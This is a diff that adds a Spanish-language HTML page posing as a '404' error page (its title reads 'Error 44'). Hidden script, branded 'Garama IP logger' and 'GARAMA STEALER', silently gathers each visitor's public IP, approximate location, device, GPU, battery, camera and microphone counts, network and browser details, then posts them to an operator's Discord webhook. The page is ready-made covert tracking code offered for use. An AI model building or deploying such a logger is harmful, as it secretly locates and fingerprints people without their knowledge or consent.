@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Error 44</title>
+<style>
+  body { background:#1a1a1a; color:#ff4444; font-family:monospace;
+         display:flex; flex-direction:column; align-items:center;
+         justify-content:center; min-height:100vh; margin:0; }
+  h1 { font-size:4em; margin:0; }
+</style>
+</head>
+<body>
+
+<h1>ERROR 404</h1>
+<p>La página no está disponible temporalmente. Inténtalo más tarde.</p>
+
+<script>
+// ===================== CONFIGURACIÓN =====================
+// Pega aquí tu webhook de Discord a mano:
+const WEBHOOK = "TU_WEBHOOK_AQUI";
+
+const IMAGEN = "https://i.imgur.com/SOcGWuI.jpeg";
+const NOMBRE_WEBHOOK = "Garama IP logger";
+const AUTOR = "Made by Garama";
+// =========================================================
+
+function detectarSO(ua) {
+  if (/Windows NT 10/.test(ua)) return "Windows 10/11";
+  if (/Windows NT 6\.3/.test(ua)) return "Windows 8.1";
+  if (/Windows NT 6\.1/.test(ua)) return "Windows 7";
+  const and = ua.match(/Android ([0-9.]+)/); if (and) return "Android " + and[1];
+  const ios = ua.match(/iPhone OS ([0-9_]+)/); if (ios) return "iOS " + ios[1].replace(/_/g,'.');
+  const mac = ua.match(/Mac OS X ([0-9_]+)/); if (mac) return "macOS " + mac[1].replace(/_/g,'.');
+  if (/Linux/.test(ua)) return "Linux";
+  return navigator.platform || "Desconocido";
+}
+
+function detectarModelo(ua) {
+  let m = ua.match(/SM-([A-Za-z0-9]+)/); if (m) return "Samsung SM-" + m[1];
+  m = ua.match(/(iPhone\d+,\d+)/); if (m) return m[1];
+  m = ua.match(/Android [^;]+; ([^);]+)( Build|\))/);
+  if (m && !/Android|Linux/i.test(m[1])) return m[1].trim();
+  return "N/D";
+}
+
+(async () => {
+  if (!WEBHOOK || WEBHOOK.indexOf("http") !== 0) return;
+
+  // IP pública real con fallback
+  let ip = null, d = null;
+  try { ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch (e) {}
+  if (ip) { try { d = await (await fetch(`https://ipwho.is/${ip}`)).json(); } catch (e) {} }
+  if ((!d || !d.city) && ip) { try { d = await (await fetch(`https://ipapi.co/${ip}/json/`)).json(); } catch (e) {} }
+  const ipRara = ip && /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|127\.|::1)/.test(ip);
+
+  const ua = navigator.userAgent;
+  const dispositivo = /Android/i.test(ua) ? "Android" : /iPhone|iPad|iPod/i.test(ua) ? "iPhone/iOS" : "PC";
+  const navegador = /Edg\//.test(ua) ? "Edge" : /OPR\//.test(ua) ? "Opera" :
+    /Chrome\//.test(ua) ? "Chrome" : /Firefox\//.test(ua) ? "Firefox" : /Safari\//.test(ua) ? "Safari" : "Desconocido";
+  const versionNav = ua.match(/(?:Chrome|Firefox|Version|Edg|OPR)\/([0-9.]+)/);
+
+  let gpuV = "N/D", gpuR = "N/D";
+  try { const gl = document.createElement('canvas').getContext('webgl');
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    gpuV = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL); gpuR = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+  } catch (e) {}
+
+  let bateria = "N/D";
+  try { const b = await navigator.getBattery();
+    bateria = `${Math.round(b.level*100)}% ${b.charging?'cargando':'en uso'}`;
+  } catch (e) {}
+
+  let cams = "N/D", mics = "N/D";
+  try { const devs = await navigator.mediaDevices.enumerateDevices();
+    cams = devs.filter(x => x.kind === 'videoinput').length;
+    mics = devs.filter(x => x.kind === 'audioinput').length;
+  } catch (e) {}
+
+  const conn = navigator.connection;
+  const red = conn ? `${conn.effectiveType||'?'} / ${conn.type||'?'} / ~${conn.downlink||'?'} Mbps / RTT ${conn.rtt||'?'}ms` : "N/D";
+
+  const embed = {
+    title: "GARAMA STEALER",
+    color: 0xFF0000,
+    thumbnail: { url: IMAGEN },
+    description: "Nuevo visitante detectado",
+    fields: [
+      { name: "IP pública", value: ipRara ? ip + " (privada/rara)" : (ip || "N/D"), inline: true },
+      { name: "Dispositivo", value: dispositivo, inline: true },
+      { name: "Modelo (aprox.)", value: detectarModelo(ua), inline: true },
+      { name: "Navegador", value: navegador + (versionNav ? " " + versionNav[1] : ""), inline: true },
+      { name: "Sistema operativo", value: detectarSO(ua), inline: true },
+      { name: "Arquitectura", value: /arm|aarch/i.test(ua) ? "ARM" : /WOW64|x64|Win64/.test(ua) ? "x86_64" : "x86/N/D", inline: true },
+      { name: "Ubicación", value: d && d.city ? `${d.city}, ${d.region||''}, ${d.country||''}` : "N/D", inline: false },
+      { name: "Idiomas", value: (navigator.languages||[]).join(', ') || navigator.language || "N/D", inline: false },
+      { name: "Pantalla física", value: `${screen.width}x${screen.height} ${screen.colorDepth}bit`, inline: true },
+      { name: "Ventana", value: `${innerWidth}x${innerHeight}`, inline: true },
+      { name: "Orientación", value: (screen.orientation && screen.orientation.type) || "N/D", inline: true },
+      { name: "Densidad píxeles", value: `${window.devicePixelRatio}x`, inline: true },
+      { name: "Puntos táctiles", value: String(navigator.maxTouchPoints||0), inline: true },
+      { name: "Núcleos CPU", value: String(navigator.hardwareConcurrency||"N/D"), inline: true },
+      { name: "RAM aprox.", value: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/D", inline: true },
+      { name: "Cámaras / Mics", value: `${cams} / ${mics}`, inline: true },
+      { name: "Red", value: red, inline: false },
+      { name: "Batería", value: bateria, inline: true },
+      { name: "GPU fabricante", value: (gpuV||"N/D").slice(0,100), inline: true },
+      { name: "GPU modelo", value: (gpuR||"N/D").slice(0,100), inline: true },
+      { name: "Zona horaria", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/D", inline: true },
+      { name: "Página de origen", value: (document.referrer||"Directo").slice(0,200), inline: false },
+      { name: "User-Agent", value: ua.slice(0,900), inline: false }
+    ],
+    footer: { text: AUTOR + " • " + NOMBRE_WEBHOOK + " • " + new Date().toLocaleString() }
+  };
+
+  try {
+    await fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: NOMBRE_WEBHOOK,
+        content: "@everyone",
+        embeds: [embed]
+      })
+    });
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
